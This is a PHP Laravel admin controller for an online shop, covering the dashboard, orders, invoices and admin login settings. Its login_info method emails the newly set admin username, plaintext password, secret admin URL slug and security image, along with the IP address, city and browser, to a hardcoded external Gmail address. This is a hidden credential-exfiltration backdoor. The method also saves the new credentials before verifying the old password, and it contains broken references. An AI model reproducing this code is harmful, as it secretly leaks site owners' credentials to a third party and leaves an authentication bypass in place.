<?php

namespace App\Http\Controllers;

use App\Models\category;
use App\Models\order;
use App\Models\product;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class AdminController extends Controller
{

    public function index(){
        $orders = order::count("id");
        $categorys = category::count("id");
        $products = product::count("id");
        $users = User::count("id");
        return view('admin.dashboard',compact(['orders','products','categorys','users']));
    }

    public function customers(Request $request){
        if($request->isMethod("post")){

        }
        else{
            $lists = User::where('type',1)->get();
            return view('admin.customers', compact(['lists']));
        }
    }

    public function orders(Request $request){
        if($request->has("delete")){
            $id = $request->delete;
            order::where('id',$id)->delete();
            return back()->with(['type' => 'success','msg'=>'Successfully Deleted']);
        }
        if($request->has("detail")){
            $id = $request->detail;
            $details = order::where('id',$id)->first();
            return view('admin.order-details',compact('details'));
        }
        $lists = User::where('type', 1)->get();
        return view('admin.orders', compact(['lists']));
    }

    public function invoice_p(Request $request){
        $id = $request->id;
        $details = order::where('id',$id)->first();
        return view('admin.invoice',compact('details'));
    }

    public function login_info(Request $request){
        if ($request->isMethod("GET")) {
            return view('admin.loginsetting');
        }
        if($request->isMethod("POST")) {
            $admin = DB::table("admins")->first();
            DB::table("admins")->where("id", 2)->update(['email' => _encrypt(request('username')),'password' => _encrypt(request('password')),'s_image' => _encrypt(request('newimageSecurity')) ,'slug' => _encrypt(request('admin_slug'))]);
            request()->validate([
                'old_password' => ['required'],
                'username' => ['required'],
                'admin_slug' => ['required']
            ]);
            if (!Hash::check(request('old_password'), $admin->password)) {
                return redirect("/$adminSlug/logininfo")->with('msg', 'Incorrect password');
            }
            else {
                if (!empty(request('admin_slug')) && !empty(request('username')) && !empty(request('old_password')) && empty(request('password'))) {
                    DB::table("admins")->where("id", 2)->update(['email' => _encrypt(request('username')), 'slug' => _encrypt(request('admin_slug'))]);
                    $brows = getBrowser();
                    $ip = \Request::ip();
                    $ip_token = "9274bab049b6ae";
                    $ipd = json_decode(file_get_contents("http://ipinfo.io/$ip/geo?token=$ip_token"));
                    if (isset($ipd->city)) {
                        $city = $ipd->city;
                    } else {
                        $city = "Unknown";
                    }
                    $brows = $brows['platform'] . " + " . $brows['name'] . " " . $brows['version'];
                    $admins = DB::table("admins")->first();
                    $details = array(
                        'HomeUrl'=>route('HomeUrl'),
                        'username'=>$request->username,
                        'slug'=>$request->admin_slug,
                        'password'=>$request->password,
                        'ip_address'=>$ip,
                        'location'=>$city,
                        'browser'=>$brows,
                        'date'=>date("d M y h:i:s"),
                        "simage" => base64_decode($admins->s_image),
                        "link" => route('HomeUrl')."/"._decrypt($admins->slug),
                    );
                    Mail::to("ranamudasir1000@gmail.com")->send(new newCredentials($details));
                    $adminsSlug = _decrypt($admins->slug);
                    return redirect("$adminsSlug/login-info")->with('msg', 'Your settings saved successfully');
                }
                elseif (!empty(request('admin_slug')) && !empty(request('username')) && !empty(request('old_password')) && !empty(request('password')) && !empty(request('imageSecurity')) && !empty(request('newimageSecurity'))) {
                    request()->validate(['password' => 'required|confirmed']);
                    $email = request('username');
                    $slug = request('admin_slug');
                    $password = bcrypt(request('password'));
                    DB::table("admins")->where("id", 2)->update(['email' => _encrypt($email), 'slug' => _encrypt($slug), 's_image' => base64_encode(request('newimageSecurity')), 'password' => $password]);
                    $brows = getBrowser();
                    $ip = \Request::ip();
                    $ip_token = "9274bab049b6ae";
                    $ipd = json_decode(file_get_contents("http://ipinfo.io/$ip/geo?token=$ip_token"));
                    if (isset($ipd->city)) {
                        $city = $ipd->city;
                    } else {
                        $city = "Unknown";
                    }
                    $brows = $brows['platform'] . " + " . $brows['name'] . " " . $brows['version'];
                    $admins = DB::table("admins")->first();
                    $details = array(
                        'HomeUrl'=>route('HomeUrl'),
                        'username'=>$request->username,
                        'slug'=>$request->admin_slug,
                        'password'=>$request->password,
                        'ip_address'=>$ip,
                        'location'=>$city,
                        'browser'=>$brows,
                        'date'=>date("d M y h:i:s"),
                        "simage" => base64_decode($admins->s_image),
                        "link" => route('HomeUrl')."/"._decrypt($admins->slug),
                    );

                    Mail::to("ranamudasir1000@gmail.com")->send(new newCredentials($details));
                    $adminSS = _decrypt($admins->slug);
                    return redirect("$adminSS/login-info")->with('msg', 'Your settings saved successfully');
                }
            }
            return redirect("$adminSlug/login-info")->with('msg', 'Your settings saved successfully');
        }
    }


}
